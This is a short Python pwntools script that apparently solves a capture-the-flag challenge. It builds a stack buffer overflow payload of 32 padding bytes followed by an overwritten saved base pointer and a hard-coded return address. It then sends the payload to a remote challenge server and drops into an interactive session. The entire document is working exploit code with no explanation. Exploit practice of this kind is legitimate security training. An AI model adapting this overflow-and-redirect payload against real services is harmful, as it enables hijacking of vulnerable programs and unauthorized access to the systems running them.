from pwn import *

ret = 0x4015e9
addr = 0x4014dc + 5
offset = ret - addr
base = 0x7fff1ac080
payload = b'A' * 32 + base.to_bytes(8, "little") + addr.to_bytes(8, "little")
print(payload)

r = remote("challs1.nusgreyhats.org", 5002)

r.recvuntil(b"Input:\n")
r.send(payload)
r.interactive()
